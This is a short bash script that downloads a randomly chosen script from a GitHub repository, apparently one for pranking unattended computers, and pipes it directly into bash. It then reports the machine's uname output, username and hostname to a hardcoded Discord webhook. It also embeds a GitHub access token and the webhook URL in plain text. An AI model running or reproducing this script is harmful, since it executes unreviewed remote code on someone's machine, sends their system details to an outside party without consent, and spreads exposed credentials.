#!/bin/bash

WEBHOOK_URL="https://discord.com/api/webhooks/885524612589424640/zxAk5zfwuSbb0Pd1---PJzi6m68BD1YHYOSia8cAnrmtCfPXcUhLZ3ZXv95EqpW9pp9f"
rdm=$(( RANDOM % 15 ))

curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" | bash
curl \
  -H "Content-Type: application/json" \
  -d "{\"content\":null,\"embeds\":[{\"title\":\"Script n°$rdm\", \"description\": \"$(curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" | sed '2q;d')\",\"url\":\"https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh\",\"color\":16711680,\"fields\":[{\"name\":\"uname:\",\"value\":\"$(uname -a)\"},{\"name\":\"user\",\"value\":\"$USER\"},{\"name\":\"hostname\",\"value\":\"$(hostname)\"}]}]}" $WEBHOOK_URL
exit
